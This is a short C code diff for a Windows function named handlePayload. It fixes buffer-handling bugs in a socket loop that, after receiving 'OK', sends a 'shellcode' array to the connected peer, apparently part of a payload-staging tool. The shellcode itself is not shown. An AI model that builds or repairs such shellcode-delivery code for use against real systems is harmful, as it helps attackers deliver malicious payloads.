@@ -14,8 +14,8 @@ int handlePayload(LPVOID args) {
     while (1) {
         bytesReceived = recv(acceptSocket, buffer, sizeof(buffer) - 1, 0);
         if (bytesReceived <= 0) break;
-        buffer[bytes] = '\0';
-        if (strcmp(cmdBuf, "OK") != 0) break;
+        buffer[bytesReceived] = '\0';
+        if (strcmp(buffer, "OK") != 0) break;
         send(acceptSocket, shellcode, sizeof(shellcode), 0);
     }
 
